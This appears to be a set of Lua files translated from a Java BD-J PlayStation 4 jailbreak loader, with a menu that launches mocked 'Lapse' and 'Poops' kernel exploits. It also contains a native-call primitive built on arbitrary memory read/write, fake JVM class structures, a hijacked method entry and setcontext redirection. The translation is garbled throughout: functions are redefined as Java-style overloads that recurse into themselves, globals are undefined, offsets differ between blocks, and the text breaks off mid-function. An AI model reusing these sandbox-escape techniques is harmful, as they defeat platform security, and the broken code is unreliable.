
local InitXlet = {}

InitXlet.BUTTON_X = 10
InitXlet.BUTTON_O = 19
InitXlet.BUTTON_U = 38
InitXlet.BUTTON_D = 40

local instance = nil

local EventQueue = {}
function EventQueue:new()
    local obj = {
        l = {},
        cnt = 0
    }
    setmetatable(obj, {__index = self})
    return obj
end

function EventQueue:put(obj)
    table.insert(self.l, obj)
    self.cnt = self.cnt + 1
end

function EventQueue:get()
    if self.cnt == 0 then
        return nil
    end
    local o = self.l[1]
    table.remove(self.l, 1)
    self.cnt = self.cnt - 1
    return o
end

InitXlet.EventQueue = EventQueue

local messages = {}

local console

function InitXlet:initXlet(context)
    -- Privilege escalation
    -- try
    --     DisableSecurityManagerAction.execute();
    -- catch (Exception e) {}

    instance = self
    self.context = context
    self.eq = EventQueue:new()
    --self.scene = HSceneFactory.getInstance().getDefaultHScene() -- TODO: Implement HScene
    self.scene = {} -- Mock HScene
    local scene = self.scene
    
    self.gui = Screen:new(messages)
    local gui = self.gui
    gui:setSize(1920, 1080) -- BD screen size
    --scene.add(gui, BorderLayout.CENTER); -- TODO: Implement scene.add
    scene.gui = gui -- Mock scene.add
    
    --UserEventRepository repo = new UserEventRepository("input");
    local repo = {name = "input", keys = {}}
    --repo.addKey(BUTTON_X);
    table.insert(repo.keys, InitXlet.BUTTON_X)
    --repo.addKey(BUTTON_O);
    table.insert(repo.keys, InitXlet.BUTTON_O)
    --repo.addKey(BUTTON_U);
    table.insert(repo.keys, InitXlet.BUTTON_U)
    --repo.addKey(BUTTON_D);
    table.insert(repo.keys, InitXlet.BUTTON_D)
    --EventManager.getInstance().addUserEventListener(this, repo);
    -- Mock EventManager
    Helper.eventManager = Helper.eventManager or {}
    Helper.eventManager.listeners = Helper.eventManager.listeners or {}
    table.insert(Helper.eventManager.listeners, {listener = self, repo = repo})
    
    local threadFunc = function()
        --try
        --{
            scene.repaint() --Mock
            console = MessagesOutputStream:new(messages, scene) -- TODO: MessagesOutputStream should write to messages
            console.println("Hen Loader LP v1.0, based on:")
            console.println("- GoldHEN 2.4b18.7 by SiSTR0")
            console.println("- poops code by theflow0")
            console.println("- lapse code by Gezine")
            console.println("- BDJ build environment by kimariin")
            console.println("- java console by sleirsgoevy")
            console.println("")
            --System.gc(); -- this workaround somehow makes Call API working
            --if (System.getSecurityManager() != null) {
            --    console.println("Priviledge escalation failure, unsupported firmware?");
            --} else {
            Kernel.initializeKernelOffsets()
            local fw = Helper.getCurrentFirmwareVersion()
            console.println("Firmware: " .. fw)
            if not KernelOffset.hasPS4Offsets() then
                console.println("Unsupported Firmware")
            else
                while true do
                    local lapseFailCount = 0
                    local c = 0
                    local lapseSupported = (fw ~= "12.50" and fw ~= "12.52")
                    console.println("\nSelect the mode to run:")
                    if lapseSupported then
                        console.println("* X = Lapse")
                        console.println("* O = Poops")
                    else
                        console.println("* X = Poops")
                    end
                    
                    while (c ~= InitXlet.BUTTON_O or not lapseSupported) and c ~= InitXlet.BUTTON_X do
                        c = self:pollInput()
                    end
                    if c == InitXlet.BUTTON_X and lapseSupported then
                        local result = Lapse.main(console)
                        if result == 0 then
                            console.println("Success")
                            break
                        end
                        if result <= -6 or lapseFailCount >= 3 then
                            console.println("Fatal fail(" .. result .. "), please REBOOT PS4")
                            break
                        else
                            console.println("Failed (" .. result .. "), but you can try again")
                        end
                    else
                        local result = Poops.main(console)
                        if result == 0 then
                            console.println("Success")
                            break
                        else
                            console.println("Fatal fail(" .. result .. "), please REBOOT PS4")
                            break
                        end
                    end
                end
            end
            --}
        --catch(Throwable e)
        --{
        --    scene.repaint()
        --}
    end
    Helper.startThread(threadFunc)
    --}).start()
    --}
    --catch(Throwable e)
    --{
    --    printStackTrace(e)
    --}
    scene.validate() -- Mock
end

function InitXlet:startXlet()
    self.gui:setVisible(true)
    self.scene:setVisible(true) --Mock
    self.gui:requestFocus()
end

function InitXlet:pauseXlet()
    self.gui:setVisible(false)
end

function InitXlet:destroyXlet(unconditional)
    --scene.remove(gui);
    self.scene.gui = nil
    self.scene = nil
end

function InitXlet:printStackTrace(e)
    --StringWriter sw = new StringWriter();
    --PrintWriter pw = new PrintWriter(sw);
    --e.printStackTrace(pw);
    --if (console != null)
    --    console.print(sw.toString());
    print(debug.traceback(e, 2))
end

function InitXlet:userEventReceived(evt)
    local ret = false
    if evt.type == "HRcEvent.KEY_PRESSED" then -- Mock
        ret = true
        if evt.code == InitXlet.BUTTON_U then
            self.gui.top = self.gui.top + 270
        elseif evt.code == InitXlet.BUTTON_D then
            self.gui.top = self.gui.top - 270
        else
            ret = false
        end
        self.scene.repaint() -- Mock
    end
    if ret then
        return
    end
    if evt.type == "HRcEvent.KEY_PRESSED" then -- Mock
        self.eq:put(evt.code)
    end
end

function InitXlet.repaint()
end

function InitXlet:pollInput()
    local obj = self.eq:get()
    while obj == nil do
        Helper.sleep(50)
        obj = self.eq:get()
    end
    return obj
end

-- Helper functions and classes (moved to top for accessibility)
local Helper = {}

function Helper.startThread(func)
    local co = coroutine.create(func)
    coroutine.resume(co)
end

function Helper.sleep(ms)
    -- Mock sleep
    -- In real environment, implement sleep using system calls
    local start = os.clock()
    while os.clock() - start < ms / 1000 do
        -- Do nothing, just burn CPU cycles
    end
end

function Helper.getCurrentFirmwareVersion()
    -- Mock implementation
    return "11.00"
end

local Kernel = {}

function Kernel.initializeKernelOffsets()
    -- Mock implementation
end

local KernelOffset = {}

function KernelOffset.hasPS4Offsets()
    -- Mock implementation
    return true
end

-- Mock classes
local Screen = {}

function Screen:new(messages)
    local obj = {
        messages = messages,
        top = 0,
        visible = false
    }
    setmetatable(obj, {__index = self})
    return obj
end

function Screen:setSize(width, height)
    self.width = width
    self.height = height
end

function Screen:setVisible(visible)
    self.visible = visible
end

function Screen:requestFocus()
    -- Mock implementation
end

local MessagesOutputStream = {}

function MessagesOutputStream:new(messages, scene)
    local obj = {
        messages = messages,
        scene = scene,
    }
    setmetatable(obj, {__index = self})
    return obj
end

function MessagesOutputStream:println(text)
    table.insert(self.messages, text)
    -- self.scene:repaint() -- Call repaint on scene after adding a new message
end

function MessagesOutputStream:print(text)
    table.insert(self.messages, text)
    -- self.scene:repaint() -- Call repaint on scene after adding a new message
end

-- Mock Lapse and Poops
local Lapse = {}
function Lapse.main(console)
    console:println("Running Lapse (mock)")
    return 0
end

local Poops = {}
function Poops.main(console)
    console:println("Running Poops (mock)")
    return 0
end

return InitXlet
```

```lua
Helper = Helper or {}

function HenLoader_pollInput()
    local ans = HenLoader.eq:get()
    if ans == nil then
        return 0
    end
    return ans
end

MessagesOutputStream = {}
MessagesOutputStream.__index = MessagesOutputStream

function MessagesOutputStream:new(msgs, sc)
    local self = setmetatable({}, MessagesOutputStream)
    self.messages = msgs
    self.scene = sc
    self.cur = ""
    table.insert(self.messages, self.cur)
    return self
end

function MessagesOutputStream:write(c)
    if c == 10 then
        self.scene:repaint()
        self.cur = ""
        table.insert(self.messages, self.cur)
    elseif c ~= 179 then
        self.cur = self.cur .. string.char(c)
        self.messages[#self.messages] = self.cur
    end
end

Screen = {}
Screen.__index = Screen

function Screen:new(messages)
    local self = setmetatable({}, Screen)
    self.messages = messages
    self.font = Helper.api.createFont(nil, 0, 36)
    self.top = 40
    return self
end

function Screen:paint(g)
    g:setColor(100, 110, 160)
    g:fillRect(0, 0, self:getWidth(), self:getHeight())
    g:setFont(self.font)
    g:setColor(255, 255, 255)
    for i = 1, #self.messages do
        local message = self.messages[i]
        local message_width = g:getFontMetrics():stringWidth(message)
        g:drawString(message, 0, self.top + ((i-1)*40))
    end
end

API = {}
API.__index = API

API.RTLD_DEFAULT = -2
API.LIBC_MODULE_HANDLE = 0x2
API.LIBKERNEL_MODULE_HANDLE = 0x2001
API.LIBJAVA_MODULE_HANDLE = 0x4A
API.UNSUPPORTED_DLOPEN_OPERATION_STRING = "Unsupported dlopen() operation"
API.JAVA_JAVA_LANG_REFLECT_ARRAY_MULTI_NEW_ARRAY_SYMBOL = "Java_java_lang_reflect_Array_multiNewArray"
API.JVM_NATIVE_PATH_SYMBOL = "JVM_NativePath"
API.SIGSETJMP_SYMBOL = "sigsetjmp"
API.UX86_64_SETCONTEXT_SYMBOL = "__Ux86_64_setcontext"
API.ERROR_SYMBOL = "__error"
API.MULTI_NEW_ARRAY_METHOD_NAME = "multiNewArray"
API.MULTI_NEW_ARRAY_METHOD_SIGNATURE = "(J[I)J"
API.NATIVE_LIBRARY_CLASS_NAME = "java.lang.ClassLoader$NativeLibrary"
API.FIND_METHOD_NAME = "find"
API.FIND_ENTRY_METHOD_NAME = "findEntry"
API.HANDLE_FIELD_NAME = "handle"
API.VALUE_FIELD_NAME = "value"
API.MULTI_NEW_ARRAY_DIMENSIONS = {1}
API.ARRAY_BASE_OFFSET = 0x18

local callContexts = {}

local instance

function API:new()
    local self = setmetatable({}, API)
    self:init()
    return self
end

function API.getInstance()
    if not instance then
        instance = API:new()
    end
    return instance
end

function API:isJdk11()
    return self.jdk11
end

function API:init()
    self:initUnsafe()
    self:initDlsym()
    self:initSymbols()
    self:initApiCall()
end

function API:initUnsafe()
    self.unsafe = UnsafeSunImpl:new()
    self.jdk11 = false
end

function API:initDlsym()
    local nativeLibraryClass = Helper.getClass(API.NATIVE_LIBRARY_CLASS_NAME)

    if self.jdk11 then
        self.findMethod = nativeLibraryClass:getDeclaredMethod(API.FIND_ENTRY_METHOD_NAME, {Helper.getClass("java.lang.String")})
    else
        self.findMethod = nativeLibraryClass:getDeclaredMethod(API.FIND_METHOD_NAME, {Helper.getClass("java.lang.String")})
    end

    self.handleField = nativeLibraryClass:getDeclaredField(API.HANDLE_FIELD_NAME)

    self.findMethod:setAccessible(true)
    self.handleField:setAccessible(true)

    local nativeLibraryConstructor = nativeLibraryClass:getDeclaredConstructor({Helper.getClass("java.lang.Class"), Helper.getClass("java.lang.String"), Helper.getClass("java.lang.Boolean")})
    nativeLibraryConstructor:setAccessible(true)

    self.nativeLibrary = nativeLibraryConstructor:newInstance({self:getClass(), "api", true})
end

function API:initSymbols()
    self.JVM_NativePath = self:dlsym(API.RTLD_DEFAULT, API.JVM_NATIVE_PATH_SYMBOL)
    if self.JVM_NativePath == 0 then
        error("JVM_NativePath not found")
    end

    self.__Ux86_64_setcontext = self:dlsym(API.LIBKERNEL_MODULE_HANDLE, API.UX86_64_SETCONTEXT_SYMBOL)
    if self.__Ux86_64_setcontext == 0 then
        self.executableHandle = bit.band(self.JVM_NativePath, -4)
        while self:strcmp(self.executableHandle, API.UNSUPPORTED_DLOPEN_OPERATION_STRING) ~= 0 do
            self.executableHandle = self.executableHandle + 4
        end
        self.executableHandle = self.executableHandle - 4

        self.__Ux86_64_setcontext = self:dlsym(API.LIBKERNEL_MODULE_HANDLE, API.UX86_64_SETCONTEXT_SYMBOL)
    end
    if self.__Ux86_64_setcontext == 0 then
        error("__Ux86_64_setcontext not found")
    end

    if self.jdk11 then
        self.Java_java_lang_reflect_Array_multiNewArray = self:dlsym(API.LIBJAVA_MODULE_HANDLE, API.JAVA_JAVA_LANG_REFLECT_ARRAY_MULTI_NEW_ARRAY_SYMBOL)
    else
        self.Java_java_lang_reflect_Array_multiNewArray = self:dlsym(API.RTLD_DEFAULT, API.JAVA_JAVA_LANG_REFLECT_ARRAY_MULTI_NEW_ARRAY_SYMBOL)
    end
    if self.Java_java_lang_reflect_Array_multiNewArray == 0 then
        error("Java_java_lang_reflect_Array_multiNewArray not found")
    end

    self.sigsetjmp = self:dlsym(API.LIBKERNEL_MODULE_HANDLE, API.SIGSETJMP_SYMBOL)
    if self.sigsetjmp == 0 then
        error("sigsetjmp not found")
    end

    self.__error = self:dlsym(API.LIBKERNEL_MODULE_HANDLE, API.ERROR_SYMBOL)
    if self.__error == 0 then
        error("__error not found")
    end
end

function API:initApiCall()
    local apiInstance = self:addrof(self)
    local apiKlass = self:read64(apiInstance + 0x08)

    local installed = false
    if self.jdk11 then
        local methods = self:read64(apiKlass + 0x170)
        local numMethods = self:read32(methods + 0x00)

        for i = 0, numMethods - 1 do
            local method = self:read64(methods + 0x08 + i * 8)
            local constMethod = self:read64(method + 0x08)
            local constants = self:read64(constMethod + 0x08)
            local nameIndex = self:read16(constMethod + 0x2A)
            local signatureIndex = self:read16(constMethod + 0x2C)
            local nameSymbol = bit.band(self:read64(constants + 0x40 + nameIndex * 8), -2)
```

```lua
Helper = Helper or {}

function Helper:install(apiKlass)
  local installed = false
  if self.jdk11 then
    local methods = self:read64(apiKlass + 0xB0)
    local numMethods = self:read32(methods + 0x10)

    for i = 0, numMethods - 1 do
      local method = self:read64(methods + 0x18 + i * 8)
      local constMethod = self:read64(method + 0x10)
      local constants = self:read64(method + 0x18)
      local nameIndex = self:read16(constMethod + 0x42)
      local signatureIndex = self:read16(constMethod + 0x44)
      local nameSymbol = self:read64(constants + 0x40 + nameIndex * 8) & -2
      local signatureSymbol = self:read64(constants + 0x40 + signatureIndex * 8) & -2
      local nameLength = self:read16(nameSymbol + 0x00)
      local signatureLength = self:read16(signatureSymbol + 0x00)

      local name = self:readString(nameSymbol + 0x06, nameLength)
      local signature = self:readString(signatureSymbol + 0x06, signatureLength)
      if name == self.MULTI_NEW_ARRAY_METHOD_NAME and signature == self.MULTI_NEW_ARRAY_METHOD_SIGNATURE then
        self:write64(method + 0x50, self.Java_java_lang_reflect_Array_multiNewArray)
        installed = true
        break
      end
    end
  else
    local methods = self:read64(apiKlass + 0xC8)
    local numMethods = self:read32(methods + 0x10)

    for i = 0, numMethods - 1 do
      local method = self:read64(methods + 0x18 + i * 8)
      local constMethod = self:read64(method + 0x10)
      local constants = self:read64(method + 0x18)
      local nameIndex = self:read16(constMethod + 0x42)
      local signatureIndex = self:read16(constMethod + 0x44)
      local nameSymbol = self:read64(constants + 0x40 + nameIndex * 8) & -2
      local signatureSymbol = self:read64(constants + 0x40 + signatureIndex * 8) & -2
      local nameLength = self:read16(nameSymbol + 0x08)
      local signatureLength = self:read16(signatureSymbol + 0x08)

      local name = self:readString(nameSymbol + 0x0A, nameLength)
      local signature = self:readString(signatureSymbol + 0x0A, signatureLength)
      if name == self.MULTI_NEW_ARRAY_METHOD_NAME and signature == self.MULTI_NEW_ARRAY_METHOD_SIGNATURE then
        self:write64(method + 0x78, self.Java_java_lang_reflect_Array_multiNewArray)
        installed = true
        break
      end
    end
  end

  if not installed then
    error("installing native method failed")
  end

  -- Invoke call method many times to kick in optimization.
  self:train()
end

function Helper:train()
  for i = 0, 9999 do
    self:call(0)
  end
end

function Helper:buildContext(contextBuf, jmpBuf, offset, rip, rdi, rsi, rdx, rcx, r8, r9)
  local rbx = jmpBuf[(offset + 0x08) / 8 + 1]
  local rsp = jmpBuf[(offset + 0x10) / 8 + 1]
  local rbp = jmpBuf[(offset + 0x18) / 8 + 1]
  local r12 = jmpBuf[(offset + 0x20) / 8 + 1]
  local r13 = jmpBuf[(offset + 0x28) / 8 + 1]
  local r14 = jmpBuf[(offset + 0x30) / 8 + 1]
  local r15 = jmpBuf[(offset + 0x38) / 8 + 1]

  contextBuf[(offset + 0x48) / 8 + 1] = rdi
  contextBuf[(offset + 0x50) / 8 + 1] = rsi
  contextBuf[(offset + 0x58) / 8 + 1] = rdx
  contextBuf[(offset + 0x60) / 8 + 1] = rcx
  contextBuf[(offset + 0x68) / 8 + 1] = r8
  contextBuf[(offset + 0x70) / 8 + 1] = r9
  contextBuf[(offset + 0x80) / 8 + 1] = rbx
  contextBuf[(offset + 0x88) / 8 + 1] = rbp
  contextBuf[(offset + 0xA0) / 8 + 1] = r12
  contextBuf[(offset + 0xA8) / 8 + 1] = r13
  contextBuf[(offset + 0xB0) / 8 + 1] = r14
  contextBuf[(offset + 0xB8) / 8 + 1] = r15
  contextBuf[(offset + 0xE0) / 8 + 1] = rip
  contextBuf[(offset + 0xF8) / 8 + 1] = rsp
end

function Helper:call(func, arg0, arg1, arg2, arg3, arg4, arg5)
  local ret = 0

  -- When func is 0, only do one iteration to avoid calling __Ux86_64_setcontext.
  -- This is used to "train" this function to kick in optimization early. Otherwise, it is
  -- possible that optimization kicks in between the calls to sigsetjmp and __Ux86_64_setcontext
  -- leading to different stack layouts of the two calls.
  local iter = func == 0 and 1 or 2

  local callContext = self:getCallContext()

  if self.jdk11 then
    callContext.fakeKlass[0xC0 / 8 + 1] = 0 -- dimension

    for i = 0, iter - 1 do
      callContext.fakeKlass[0x00 / 8 + 1] = callContext.fakeKlassVtableAddr
      callContext.fakeKlass[0x00 / 8 + 1] = callContext.fakeKlassVtableAddr
      if i == 0 then
        callContext.fakeKlassVtable[0x158 / 8 + 1] = self.sigsetjmp + 0x23 -- multi_allocate
      else
        callContext.fakeKlassVtable[0x158 / 8 + 1] = self.__Ux86_64_setcontext + 0x39 -- multi_allocate
      end

      ret = self:multiNewArray(callContext.fakeClassOopAddr, self.MULTI_NEW_ARRAY_DIMENSIONS)

      if i == 0 then
        self:buildContext(
            callContext.fakeKlass,
            callContext.fakeKlass,
            0x00,
            func,
            arg0,
            arg1,
            arg2,
            arg3,
            arg4,
            arg5)
      end
    end
  else
    callContext.fakeKlass[0xB8 / 8 + 1] = 0 -- dimension

    for i = 0, iter - 1 do
      callContext.fakeKlass[0x10 / 8 + 1] = callContext.fakeKlassVtableAddr
      callContext.fakeKlass[0x20 / 8 + 1] = callContext.fakeKlassVtableAddr
      if i == 0 then
        callContext.fakeKlassVtable[0x230 / 8 + 1] = self.sigsetjmp + 0x23 -- multi_allocate
      else
        callContext.fakeKlassVtable[0x230 / 8 + 1] = self.__Ux86_64_setcontext + 0x39 -- multi_allocate
      end

      ret = self:multiNewArray(callContext.fakeClassOopAddr, self.MULTI_NEW_ARRAY_DIMENSIONS)

      if i == 0 then
        self:buildContext(
            callContext.fakeKlass,
            callContext.fakeKlass,
            0x20,
            func,
            arg0,
            arg1,
            arg2,
            arg3,
            arg4,
            arg5)
      end
    end
  end

  if ret == 0 then
    return 0
  end

  return self:read64(ret)
end

function Helper:call(func, arg0, arg1, arg2, arg3, arg4)
  return self:call(func, arg0, arg1, arg2, arg3, arg4, 0)
end

function Helper:call(func, arg0, arg1, arg2, arg3)
  return self:call(func, arg0, arg1, arg2, arg3, 0, 0)
end

function Helper:call(func, arg0, arg1, arg2)
  return self:call(func, arg0, arg1, arg2, 0, 0, 0)
end

function Helper:call(func, arg0, arg1)
  return self:call(func, arg0, arg1, 0, 0, 0, 0)
end

function Helper:call(func, arg0)
  return self:call(func, arg0, 0, 0, 0, 0, 0)
end

function Helper:call(func)
  return self:call(func, 0, 0, 0, 0, 0, 0)
end

function Helper:errno()
  return self:read32(self:call(self.__error))
end

function Helper:dlsym(handle, symbol)
  local oldHandle = self.RTLD_DEFAULT
  local result = nil
  if self.executableHandle ~= 0 then
    -- In earlier versions, there's a bug where only the main executable's handle is used.
    oldHandle = self:read32(self.executableHandle)
    self:write32(self.executableHandle, handle)
    self.handleField:setLong(self.nativeLibrary, self.RTLD_DEFAULT)
    result = self.findMethod:invoke(self.nativeLibrary, {symbol})
  else
    self.handleField:setLong(self.nativeLibrary, handle)
    result = self.findMethod:invoke(self.nativeLibrary, {symbol})
  end

  if self.executableHandle ~= 0 then
    self:write32(self.executableHandle, oldHandle)
  end

  if result == nil then
    return 0
  else
    return result
  end
end

function Helper:addrof(obj)
  local array = {obj}
  return self.unsafe:getLong(array, self.ARRAY_BASE_OFFSET)
end

function Helper:read8(addr)
  return self.unsafe:getByte(addr)
end

function Helper:read16(addr)
  return self.unsafe:getShort(addr)
end

function Helper:read32(addr)
  return self.unsafe:getInt(addr)
end

function Helper:read64(addr)
  return self.unsafe:getLong(addr)
end

function Helper:write8(addr, val)
  self.unsafe:putByte(addr, val)
end

function Helper:write16(addr, val)
  self.unsafe:putShort(addr, val)
end

function Helper:write32(addr, val)
  self.unsafe:putInt(addr, val)
end

function Helper:write64(addr, val)
  self.unsafe:putLong(addr, val)
end

function Helper:malloc(size)
  return self.unsafe:allocateMemory(size)
end
```

```lua
Helper = Helper or {}

function API:calloc(number, size)
  local p = self:malloc(number * size)
  if p ~= 0 then
    self:memset(p, 0, number * size)
  end
  return p
end

function API:realloc(ptr, size)
  return self.unsafe:reallocateMemory(ptr, size)
end

function API:free(ptr)
  self.unsafe:freeMemory(ptr)
end

function API:memcpy(dest, src, n)
  self.unsafe:copyMemory(src, dest, n)
  return dest
end

function API:memcpy(dest, src, n)
  for i = 0, n - 1 do
    self:write8(dest + i, src[i + 1])
  end
  return dest
end

function API:memcpy(dest, src, n)
  for i = 0, n - 1 do
    dest[i + 1] = self:read8(src + i)
  end
  return dest
end

function API:memset(s, c, n)
  self.unsafe:setMemory(s, n, string.char(c))
  return s
end

function API:memset(s, c, n)
  for i = 0, n - 1 do
    s[i + 1] = string.char(c)
  end
  return s
end

function API:memcmp(s1, s2, n)
  for i = 0, n - 1 do
    local b1 = self:read8(s1 + i)
    local b2 = self:read8(s2 + i)
    if b1 ~= b2 then
      return string.byte(b1) - string.byte(b2)
    end
  end
  return 0
end

function API:memcmp(s1, s2, n)
  for i = 0, n - 1 do
    local b1 = self:read8(s1 + i)
    local b2 = s2[i + 1]
    if b1 ~= b2 then
      return string.byte(b1) - string.byte(b2)
    end
  end
  return 0
end

function API:memcmp(s1, s2, n)
  return self:memcmp(s2, s1, n)
end

function API:strcmp(s1, s2)
  for i = 0, math.huge do
    local b1 = self:read8(s1 + i)
    local b2 = self:read8(s2 + i)
    if b1 ~= b2 then
      return string.byte(b1) - string.byte(b2)
    end
    if b1 == string.char(0) and b2 == string.char(0) then
      return 0
    end
  end
end

function API:strcmp(s1, s2)
  local bytes = self:toCBytes(s2)
  for i = 0, math.huge do
    local b1 = self:read8(s1 + i)
    local b2 = bytes[i + 1]
    if b1 ~= b2 then
      return string.byte(b1) - string.byte(b2)
    end
    if b1 == string.char(0) and b2 == string.char(0) then
      return 0
    end
  end
end

function API:strcmp(s1, s2)
  return self:strcmp(s2, s1)
end

function API:strcpy(dest, src)
  for i = 0, math.huge do
    local ch = self:read8(src + i)
    self:write8(dest + i, ch)
    if ch == string.char(0) then
      break
    end
  end
  return dest
end

function API:strcpy(dest, src)
  local bytes = self:toCBytes(src)
  for i = 0, math.huge do
    local ch = bytes[i + 1]
    self:write8(dest + i, ch)
    if ch == string.char(0) then
      break
    end
  end
  return dest
end

function API:readString(src, n)
  local outputStream = {}
  for i = 0, math.huge do
    local ch = self:read8(src + i)
    if ch == string.char(0) or i == n then
      break
    end
    table.insert(outputStream, ch)
  end
  return table.concat(outputStream)
end

function API:readString(src)
  return self:readString(src, -1)
end

function API:toCBytes(str)
  local bytes = {}
  for i = 1, #str do
    bytes[i] = string.byte(str, i)
  end
  bytes[#str + 1] = string.char(0)
  return bytes
end

function API:getCallContext()
  local callContext = self.callContexts.get()
  if callContext ~= nil then
    return callContext
  end

  callContext = API.CallContext()
  self.callContexts.set(callContext)
  return callContext
end

API.CallContext = function()
  local self = {}
  local callContextBuffer

  callContextBuffer = API:malloc(
      ARRAY_BASE_OFFSET
          + 8
          + ARRAY_BASE_OFFSET
          + 0x100
          + ARRAY_BASE_OFFSET
          + 0x200
          + ARRAY_BASE_OFFSET
          + 0x400)
  if callContextBuffer == 0 then
    error("malloc failed")
  end

  -- Get array addresses.
  local fakeClassOopAddr = callContextBuffer + ARRAY_BASE_OFFSET
  local fakeClassAddr = fakeClassOopAddr + 8 + ARRAY_BASE_OFFSET
  local fakeKlassAddr = fakeClassAddr + 0x100 + ARRAY_BASE_OFFSET
  local fakeKlassVtableAddr = fakeKlassAddr + 0x200 + ARRAY_BASE_OFFSET

  local array = {}
  local arrayAddr = API:addrof(array)
  local arrayKlass = API:read64(arrayAddr + 0x08)

  -- Write array headers.
  API:write64(fakeClassOopAddr - 0x18, 1)
  API:write64(fakeClassAddr - 0x18, 1)
  API:write64(fakeKlassAddr - 0x18, 1)
  API:write64(fakeKlassVtableAddr - 0x18, 1)

  API:write64(fakeClassOopAddr - 0x10, arrayKlass)
  API:write64(fakeClassAddr - 0x10, arrayKlass)
  API:write64(fakeKlassAddr - 0x10, arrayKlass)
  API:write64(fakeKlassVtableAddr - 0x10, arrayKlass)

  API:write64(fakeClassOopAddr - 8, 0xFFFFFFFF)
  API:write64(fakeClassAddr - 8, 0xFFFFFFFF)
  API:write64(fakeKlassAddr - 8, 0xFFFFFFFF)
  API:write64(fakeKlassVtableAddr - 8, 0xFFFFFFFF)

  local callContextArray = {{}, {}, {}, {}}
  local callContextArrayAddr = API:addrof(callContextArray) + ARRAY_BASE_OFFSET

  -- Put array addresses into callContextArray.
  API:write64(callContextArrayAddr + 0x00, fakeClassOopAddr - ARRAY_BASE_OFFSET)
  API:write64(callContextArrayAddr + 0x08, fakeClassAddr - ARRAY_BASE_OFFSET)
  API:write64(callContextArrayAddr + 0x10, fakeKlassAddr - ARRAY_BASE_OFFSET)
  API:write64(callContextArrayAddr + 0x18, fakeKlassVtableAddr - ARRAY_BASE_OFFSET)

  -- Get fake arrays.
  self.fakeClassOop = callContextArray[1]
  self.fakeClass = callContextArray[2]
  self.fakeKlass = callContextArray[3]
  self.fakeKlassVtable = callContextArray[4]

  -- Restore.
  API:write64(callContextArrayAddr + 0x00, 0)
  API:write64(callContextArrayAddr + 0x08, 0)
  API:write64(callContextArrayAddr + 0x10, 0)
  API:write64(callContextArrayAddr + 0x18, 0)

  if jdk11 then
    self.fakeClassOop[1] = fakeClassAddr
    self.fakeClass[0x98 / 8 + 1] = fakeKlassAddr
    self.fakeKlassVtable[0xD8 / 8 + 1] = JVM_NativePath -- array_klass
  else
    self.fakeClassOop[1] = fakeClassAddr
    self.fakeClass[0x68 / 8 + 1] = fakeKlassAddr
    self.fakeKlassVtable[0x80 / 8 + 1] = JVM_NativePath -- array_klass
    self.fakeKlassVtable[0xF0 / 8 + 1] = JVM_NativePath -- oop_is_array
  end

  self.finalize = function()
    API:free(callContextBuffer)
  end
  return self
end

Buffer = {}

local api = API.getInstance()

Buffer.new = function(size)
  local self = {
    address = api:calloc(1, size),
    size = size
  }

  self.finalize = function()
    api:free(self.address)
  end

  self.address_ = function()
    return self.address
  end

  self.size_ = function()
    return self.size
  end

  self.getByte = function(offset)
    self:checkOffset(offset, 1)
    return api:read8(self.address + offset)
  end

  self.getShort = function(offset)
    self:checkOffset(offset, 2)
    return api:read16(self.address + offset)
  end

  self.getInt = function(offset)
    self:checkOffset(offset, 4)
    return api:read32(self.address + offset)
  end

  self.getLong = function(offset)
    self:checkOffset(offset, 8)
    return api:read64(self.address + offset)
  end

  self.putByte = function(offset, value)
    self:checkOffset(offset, 1)
```

```lua
Buffer.prototype.putByte = function(self, offset, value)
  self:checkOffset(offset, Int8.SIZE)
  Helper.api.write8(self.address + offset, value)
end

Buffer.prototype.putShort = function(self, offset, value)
  self:checkOffset(offset, Int16.SIZE)
  Helper.api.write16(self.address + offset, value)
end

Buffer.prototype.putInt = function(self, offset, value)
  self:checkOffset(offset, Int32.SIZE)
  Helper.api.write32(self.address + offset, value)
end

Buffer.prototype.putLong = function(self, offset, value)
  self:checkOffset(offset, Int64.SIZE)
  Helper.api.write64(self.address + offset, value)
end

Buffer.prototype.put = function(self, offset, buffer)
  self:checkOffset(offset, buffer.size)
  Helper.api.memcpy(self.address + offset, buffer.address, buffer.size)
end

Buffer.prototype.putBytes = function(self, offset, buffer)
  self:checkOffset(offset, #buffer)
  Helper.api.memcpy(self.address + offset, buffer, #buffer)
end

Buffer.prototype.fill = function(self, value)
  Helper.api.memset(self.address, value, self.size)
end

Buffer.prototype.checkOffset = function(self, offset, length)
  if offset < 0 or length < 0 or (offset + length) > self.size then
    error("IndexOutOfBoundsException")
  end
end

Int16 = {}
Int16.SIZE = 2

Int16.new = function(value)
  local self = {
    size = Int16.SIZE
  }
  setmetatable(self, { __index = Int16 })
  self.address = Helper.api.alloc(self.size)
  if value then
    self:set(value)
  end
  return self
end

Int16.get = function(self)
  return self:getShort(0x00)
end

Int16.set = function(self, value)
  self:putShort(0x00, value)
end

Int16Array = {}

Int16Array.new = function(length)
  local self = {
    size = length * Int16.SIZE
  }
  setmetatable(self, { __index = Int16Array })
  self.address = Helper.api.alloc(self.size)
  return self
end

Int16Array.get = function(self, index)
  return self:getShort(index * Int16.SIZE)
end

Int16Array.set = function(self, index, value)
  self:putShort(index * Int16.SIZE, value)
end

Int32 = {}
Int32.SIZE = 4

Int32.new = function(value)
  local self = {
    size = Int32.SIZE
  }
  setmetatable(self, { __index = Int32 })
  self.address = Helper.api.alloc(self.size)
  if value then
    self:set(value)
  end
  return self
end

Int32.get = function(self)
  return self:getInt(0x00)
end

Int32.set = function(self, value)
  self:putInt(0x00, value)
end

Int32Array = {}

Int32Array.new = function(length)
  local self = {
    size = length * Int32.SIZE
  }
  setmetatable(self, { __index = Int32Array })
  self.address = Helper.api.alloc(self.size)
  return self
end

Int32Array.get = function(self, index)
  return self:getInt(index * Int32.SIZE)
end

Int32Array.set = function(self, index, value)
  self:putInt(index * Int32.SIZE, value)
end

Int64 = {}
Int64.SIZE = 8

Int64.new = function(value)
  local self = {
    size = Int64.SIZE
  }
  setmetatable(self, { __index = Int64 })
  self.address = Helper.api.alloc(self.size)
  if value then
    self:set(value)
  end
  return self
end

Int64.get = function(self)
  return self:getLong(0x00)
end

Int64.set = function(self, value)
  self:putLong(0x00, value)
end

Int64Array = {}

Int64Array.new = function(length)
  local self = {
    size = length * Int64.SIZE
  }
  setmetatable(self, { __index = Int64Array })
  self.address = Helper.api.alloc(self.size)
  return self
end

Int64Array.get = function(self, index)
  return self:getLong(index * Int64.SIZE)
end

Int64Array.set = function(self, index, value)
  self:putLong(index * Int64.SIZE, value)
end

Int8 = {}
Int8.SIZE = 1

Int8.new = function(value)
  local self = {
    size = Int8.SIZE
  }
